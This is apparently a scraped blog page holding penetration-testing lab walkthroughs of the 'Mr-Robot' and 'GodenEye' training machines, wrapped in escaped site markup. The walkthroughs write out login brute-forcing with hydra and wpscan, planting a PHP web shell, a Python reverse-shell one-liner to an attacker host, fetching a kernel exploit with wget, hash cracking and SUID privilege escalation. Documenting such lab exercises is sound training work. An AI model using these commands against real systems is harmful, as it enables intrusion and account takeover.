__ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935906897.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;The first key&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935911648.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;exploit-wordpress\&quot;&gt;Exploit wordpress&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploit-wordpress\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;sort and uniq&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sort fsocity.dic | uniq &gt; fsocity-sort.dic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Hydra enumerate users&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post \&quot;/wp-login.php:log=^USER^&amp;#x26;pwd=^PASS^&amp;#x26;wp-submit=Log In:Invalid username\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935995098.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Wpscan intrude users and password&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wpscan --url http://192.168.124.4/  --usernames Elliot --passwords fsocity-sort.dic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936001210.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;[Valid Combinations Found:\nUsername: Elliot, Password: ER28-0652\nLogin in wordpress&lt;/p&gt;\n&lt;hr&gt;\n&lt;h2 id=\&quot;getshell\&quot;&gt;Getshell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#getshell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Visit Appearance-Editor,write shell code into 404.php\nThere are plenty of webshell in /usr/share/webbshells/php/\nUse php-reverse-shell.php\nRemember to change its ip and port\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936011245.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;listen port 1234 on kali.\nThen  visit any pay which  not exists.\n&lt;code&gt;nc -lvnp 1234&lt;/code&gt;\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936061435.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Found another user robot and its file\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936067906.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Decode password\nWrite ‘c3fcd3d76192e4007dfb496cca67e13b’ into hash.txt&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936335560.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nTurn to user robot&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;su robot&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936356620.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h2 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Try to escalate privilege through suid\nFind all the suid file.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936394011.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nNmap privilege escalation\nOnly can be used when nmap is version 2.02-5.21&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936402754.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;code&gt;cat /root/key-3-of-3.txt&lt;/code&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935870791.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935877529.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935887078.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;exploit-wordpress&quot;],&quot;text&quot;:[0,&quot;Exploit wordpress&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;getshell&quot;],&quot;text&quot;:[0,&quot;Getshell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mr-Robot&quot;],&quot;date&quot;:[3,&quot;2023-02-09T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/9&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/godeneye&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;GodenEye&quot;],&quot;date&quot;:[3,&quot;2023-02-08T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap  -sV -O -Pn -T4 192.168.124.44 -p-\nnmap --script vuln 192.168.124.44 -p-\ndirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt\n```\nThe nmap scanning result is as enclosure.\nThe dirb found nothing.\n***\n# Method-1\n## step-1 Intrude the login page(failed)\n![](img/1675389865498.png)\n![](img/1675389870691.png)\nI find its login page,try to intrude it.\nAuthorization is made up of user:password.\n![](img/1675389847203.png)\n![](img/1675390018821.png)\n![](img/1675390162371.png)\nFind nothing.\n## step-2 View home page source.\n![](img/1675390345344.png)\n![](img/1675390355645.png)\n`&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;`\n![](img/1675390815369.png)\nIt&#39;s unicode,decode it as html,I get &#39;InvincibleHack3r&#39;.And in source page,i known that the user is boris.Attention please,&#39;boris&#39; not &#39;Boris&#39;.\n![](img/1675391828534.png)\n\nView source code of this page.In the end i find an explanatory note.\n![](img/1675391692695.png)\n## step-3 POP3 \nFrom nmap result,55007 is pop3 port.\n![](img/1675393082037.png)\nUse burpsuite to send packet.It response us slowly,be pacient.\nIntrude pop3 password.I guess its username is &#39;natalya&#39; or &#39;boris&#39;.\n```\nhydra -s 55007 -L username.txt  -P /usr/share/set/src/fasttrack/wordlist.txt -e nsr -t 22 192.168.124.44 pop3\n```\nThen I get password.Attention,intrude it successfully only with /usr/share/set/src/fasttrack/wordlist.txt.\n`natalya:bird`\n`boris:secret1!`\n## step-4 Login mailbox\n```\ntelnet 192.168.124.44 55007\n\nuser natalya\npass bird\n\nlist\n+OK 2 messages:\n1 631\n2 1048\n.\n\nretr 1\n```\nI find two mails.And the second is critical.\n![](img/1675394170762.png)\n![](img/1675394314719.png)\n## step-5 Login in gnocertdir\nEdit /etc/hosts\n![](img/1675394962917.png)\nVisit servernaya-station.com/gnocertdir\n![](img/1675395021833.png)\nThe username and password has be shown in the second mail.\nI find a mail of doak.Try to intrude doak&#39;s mailbox.\nThen Get doak:goat\n![](img/1675395868856.png)\nFind another account of this system in doak&#39;s mailbox.\nusername: dr_doak\npassword: 4England!\nSign in system with this account.\nI find a file named secret.txt.\n![](img/1675396334057.png)\nDownload picture for-007.jpg\nOpen this picture in notepad++,something intersting show.\n![](img/1675396627851.png)\nDecode &#39;eFdpbnRlcjE5OTV4IQ==&#39;,get &#39;xWinter1995x!&#39;\n## step-6 Moodlecms exploitation\nxWinter1995x! is the password of admin\nThe version of moodle cms is 2.2.3\n![](img/1675845464385.png)\nIt seems that we can use msf to get shell.\nBefore exploit it,set text editor.\n![](img/1675905870571.png)\n![](img/1675905558594.png)\n## Step-7 Privilege escalation\nIt&#39;s www-data now\nSearch vulnerability to escalate privilege.\n```\nsearchsploit linux ubuntu 3.13\n```\n![](img/1675906171442.png)\nUse 37292.c\nThe absolute path of shellcode is /usr/share/exploitdb/exploits/\nmove it to /home/kali\nedit  37292.c,because there is no gcc in  target host .Use cc\n![](img/1675911223227.png)\n\nchange shell to meterpreter\n```\nuse post/multi/manage/shell_to_meterpreter\nset session 1\nexploit\nsessions -i 2\nupload 37292.c\nshell\n```\n\nHow to use 37292.c will be described in it&#39;s code.\n```\nchmod 777 37292.c\ncc -o exp 37292.c\n./exp\n```\n![](img/1675912183070.png)\n\n***\n#  Method-2 Reverse shell\n## Step-6 Moodlecms exploitation\nIn &#39;Site administration-Server-System paths&#39;,I find a web which can be used to upload shellcode.\n\n```\npython -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.124.4\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;\n```\n![](img/1675912534581.png)\nlisten port 6666 in vps.\n`nc lvnp 6666`\ncheck spell\n![](img/1675912972431.png)\nThen will get a shell\n![](img/1675913050473.png)\n ## Step-7 Privilege escalation\n Turn shell to python shell\n ```\n python -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; \n ```\n![](img/1675914702007.png)\n\n```\npython3 -m http.server 5555\n```\nIn the shell\n`wget http://192.168.124.5:5555/37292.c`\n\n***\n# Enclosure\n![](img/1675329659408.png)\n![](img/1675329715883.png)\n```\nNot shown: 65531 closed tcp ports (reset)\nPORT      STATE SERVICE\n25/tcp    open  smtp\n| smtp-vuln-cve2010-4344: \n|_  The SMTP server is not Exim: NOT VULNERABLE\n| ssl-dh-params: \n|   VULNERABLE:\n|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use anonymous\n|       Diffie-Hellman key exchange only provide protection against passive\n|       eavesdropping, and are vulnerable to active man-in-the-middle attacks\n|       which could completely compromise the confidentiality and integrity\n|       of any data exchanged over the resulting session.\n|     Check results:\n|       ANONYMOUS DH GROUP 1\n|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://www.ietf.org/rfc/rfc2246.txt\n|   \n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://weakdh.org\n|       https://www.securityfocus.com/bid/74733\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\n|   \n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       https://www.securityfocus.com/bid/70574\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|       https://www.openssl.org/~bodo/ssl-poodle.pdf\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n80/tcp    open  http\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#39;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n55006/tcp open  unknown\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       https://www.securityfocus.com/bid/70574\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|       https://www.openssl.org/~bodo/ssl-poodle.pdf\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n| ssl-dh-params: \n|   VULNERABLE:\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n55007/tcp open  unknown\nMAC Address: 00:0C:29:8D:FC:67 (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 323.07 seconds\n```\n***\n# Command 